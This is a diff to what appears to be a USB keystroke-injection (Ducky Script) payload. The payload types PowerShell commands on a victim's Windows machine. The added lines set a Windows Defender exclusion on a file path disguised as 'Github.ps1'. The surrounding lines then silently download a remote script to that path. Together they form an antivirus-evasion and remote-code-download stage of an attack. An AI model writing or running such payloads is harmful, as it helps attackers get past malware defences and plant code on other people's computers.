@@ -66,6 +66,9 @@ DELAY 500
 STRING TRY { $outputPath = $TempPath+"\Github.ps1" }CATCH{Write-Warning "Could not set outpath"}
 ENTER
 DELAY 500
+STRING TRY{ Add-MpPreference -ExclusionPath $outputPath }CATCH{Write-Warning "Could not set exclusion"}
+ENTER
+DELAY 2500
 STRING TRY { Invoke-WebRequest -Uri "$fileUrl" -OutFile "$outputPath" -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -InformationAction SilentlyContinue }CATCH{Write-Warning "Could not download script"}
 ENTER
 DELAY 500
